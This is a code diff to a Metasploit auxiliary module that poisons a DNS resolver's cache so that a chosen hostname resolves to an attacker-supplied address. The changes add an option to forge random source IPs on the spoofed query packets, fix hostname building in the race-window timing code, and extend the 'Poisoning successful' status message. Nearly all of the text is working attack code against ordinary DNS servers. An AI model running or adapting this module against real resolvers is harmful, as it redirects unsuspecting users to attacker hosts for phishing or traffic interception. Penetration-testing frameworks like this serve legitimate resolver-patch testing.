@@ -36,12 +36,14 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 			
 			register_options(
 				[
+					OptEnum.new('SRCADDR', [true, 'The source address to use for sending the queries', 'Real', ['Real', 'Random'], 'Real']),
 					OptPort.new('SRCPORT', [true, "The target server's source query port (0 for automatic)", nil]),
 					OptString.new('HOSTNAME', [true, 'Hostname to hijack', 'pwned.example.com']),
 					OptAddress.new('NEWADDR', [true, 'New address for hostname', '1.3.3.7']),
 					OptAddress.new('RECONS', [true, 'The nameserver used for reconnaissance', '208.67.222.222']),
 					OptInt.new('XIDS', [true, 'The number of XIDs to try for each query (0 for automatic)', 0]),
 					OptInt.new('TTL', [true, 'The TTL for the malicious host entry', 31337]),
+					
 				], self.class)
 					
 	end
@@ -49,7 +51,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 	def auxiliary_commands
 		return { 
 			"check" => "Determine if the specified DNS server (RHOST) is vulnerable",
-			"racer" => "Determine the size of the window for the target server"
+			"racer" => "Determine the size of the window for the target server",
 		 }
 	end
 	
@@ -129,6 +131,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 	def run
 		target   = rhost()
 		source   = Rex::Socket.source_address(target)
+		saddr    = datastore['SRCADDR']		
 		sport    = datastore['SRCPORT']
 		hostname = datastore['HOSTNAME'] + '.'
 		address  = datastore['NEWADDR']
@@ -271,10 +274,15 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 
 			req.rd = 1
 
+			src_ip = source
+			
+			if(saddr == 'Random')
+				src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
+			end
+			
 			buff = (
 				Scruby::IP.new(
-					#:src   => barbs[0][:addr].to_s,
-					:src   => source,
+					:src   => src_ip,
 					:dst   => target,
 					:proto => 17
 				)/Scruby::UDP.new(
@@ -342,7 +350,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 						answer = Resolv::DNS::Message.decode(answer)
 						answer.each_answer do |name, ttl, data|
 							if((name.to_s + ".") == hostname and data.address.to_s == address)
-								print_status("Poisoning successful after #{queries} attempts: #{name} == #{address}")
+								print_status("Poisoning successful after #{queries} queries and #{responses} responses: #{name} == #{address}")
 								disconnect_ip
 								return
 							end
@@ -374,7 +382,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 
 		times   = []
 		
-		hostname = Rex::Text.rand_text_alphanumeric(16) + domain
+		hostname = Rex::Text.rand_text_alphanumeric(16) + '.' + domain
 				
 		sock = Rex::Socket.create_udp(
 			'PeerHost' => server,
@@ -402,7 +410,7 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 					times << [Time.now.to_f - q_beg_t, cnt]
 					cnt = 0
 					
-					hostname = Rex::Text.rand_text_alphanumeric(16) + domain
+					hostname = Rex::Text.rand_text_alphanumeric(16) + '.' + domain
 
 					Thread.critical = false
 					
@@ -454,6 +462,6 @@ class Auxiliary::Spoof::Dns::BailiWickedHost < Msf::Auxiliary
 		# XXX: We should subtract the timing from the target to us (calculated based on 0.50 of our non-recursive query times)
 		avg_count
 	end	
-
+	
 end
 end	
